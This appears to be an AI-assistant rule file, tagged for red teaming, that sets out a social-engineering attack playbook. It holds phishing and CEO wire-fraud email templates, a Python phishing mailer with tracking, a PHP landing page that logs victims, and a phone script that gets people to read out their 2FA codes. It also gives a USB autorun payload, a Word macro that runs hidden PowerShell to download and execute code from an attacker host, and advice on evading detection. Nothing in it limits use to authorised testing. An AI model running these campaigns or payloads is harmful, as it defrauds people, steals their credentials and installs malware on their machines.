---
trigger: model_decision
description: "TAGS: [redteam,social-engineering,pretexting,vishing] | TRIGGERS: social,engineering,pretext,vishing,smishing,spear | SCOPE: social | DESCRIPTION: Social engineering techniques and implementation"
globs:
---
# Social Engineering Module

## Scope
Pretexting, phishing campaigns, and human manipulation techniques.

## Pretexting Frameworks

### IT Support Pretext
```
Scenario: "IT Security Team"
- Claim: Mandatory security update required
- Urgency: Account will be locked in 24 hours
- Action: Click link to verify identity

Template:
Subject: [URGENT] Security Verification Required - {Company}

Dear {Name},

Our security systems detected unusual activity on your account. 
To prevent unauthorized access, please verify your identity within 24 hours.

[Verify Now] <- Phishing link

If you don't complete this verification, your account will be 
temporarily suspended for security purposes.

IT Security Team
{Company}
```

### Executive Impersonation
```
Scenario: CEO/CFO Request
- Claim: Urgent wire transfer needed
- Authority: From C-level executive
- Pressure: Time-sensitive deal

Template:
From: {CEO Name} <ceo@{lookalike-domain}.com>
Subject: Urgent - Wire Transfer Needed

{Employee},

I need you to process an urgent wire transfer. I'm in meetings 
all day and can't call. This is for a confidential acquisition.

Amount: $47,500
Account: [Attacker Account Details]

Please confirm once sent. Keep this confidential.

{CEO Name}
Sent from iPhone
```

## Campaign Infrastructure

### Email Infrastructure
```python
# SMTP setup for campaign
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class PhishingMailer:
    def __init__(self, smtp_server, port, username, password):
        self.server = smtplib.SMTP(smtp_server, port)
        self.server.starttls()
        self.server.login(username, password)
    
    def send_phish(self, target, template, tracking_id):
        msg = MIMEMultipart('alternative')
        msg['Subject'] = template['subject']
        msg['From'] = template['from']
        msg['To'] = target
        
        # Add tracking pixel
        html = template['body'].replace(
            '</body>',
            f'<img src="https://tracker.example/p/{tracking_id}" width="1" height="1" /></body>'
        )
        
        msg.attach(MIMEText(html, 'html'))
        self.server.sendmail(template['from'], target, msg.as_string())
```

### Landing Page Tracking
```php
<?php
// Track victim interaction
$tracking_id = $_GET['id'] ?? 'unknown';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

file_put_contents('clicks.log', json_encode([
    'id' => $tracking_id,
    'ip' => $ip,
    'ua' => $ua,
    'time' => time()
]) . PHP_EOL, FILE_APPEND);

// Serve phishing page
include 'phish.html';
?>
```

## Vishing Scripts

### IT Support Call
```
Opening:
"Hi, this is {Name} from IT Support. We've detected some unusual 
activity on your account and I need to verify a few things with you."

Information Gathering:
1. "Can you confirm your employee ID?"
2. "What department are you in?"
3. "I'm going to send you a verification code - can you read it back to me?"
   (This captures their 2FA code)

Payload Delivery:
"I need you to go to {phishing-url} and enter your credentials so 
I can verify your account is secure."

Closing:
"Great, I see the verification went through. You're all set. 
If you have any issues, call the helpdesk."
```

## Payload Delivery

### USB Drop
```python
# AutoRun payload (legacy systems)
# autorun.inf
[autorun]
open=payload.exe
icon=document.ico
action=Open folder to view files
```

### Document Macros
```vba
' Word macro payload
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -ep bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"""
    Shell cmd, vbHide
End Sub
```

### QR Code Attack
```python
import qrcode

# Generate QR to phishing site
def generate_phish_qr(url, output_path):
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(url)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(output_path)

# Place in physical locations
generate_phish_qr('https://phish.example/free-wifi', 'wifi_qr.png')
```

## Campaign Management

### Target List Processing
```python
import csv

def process_targets(csv_path):
    targets = []
    with open(csv_path) as f:
        reader = csv.DictReader(f)
        for row in reader:
            targets.append({
                'email': row['email'],
                'name': row['name'],
                'department': row['department'],
                'tracking_id': generate_id()
            })
    return targets
```

### Results Tracking
```python
from datetime import datetime

class CampaignTracker:
    def __init__(self):
        self.sent = []
        self.opened = []
        self.clicked = []
        self.submitted = []
    
    def log_event(self, event_type, tracking_id, data=None):
        event = {
            'type': event_type,
            'id': tracking_id,
            'time': datetime.now().isoformat(),
            'data': data
        }
        getattr(self, event_type).append(event)
    
    def get_stats(self):
        return {
            'total_sent': len(self.sent),
            'open_rate': len(self.opened) / len(self.sent) * 100,
            'click_rate': len(self.clicked) / len(self.sent) * 100,
            'submission_rate': len(self.submitted) / len(self.sent) * 100
        }
```

## OPSEC Considerations

1. **Use separate infrastructure for each campaign**
2. **Rotate domains and IPs**
3. **Never reuse templates across targets**
4. **Implement delay between sends**
5. **Clean metadata from documents**
6. **Use TLS for all communications**
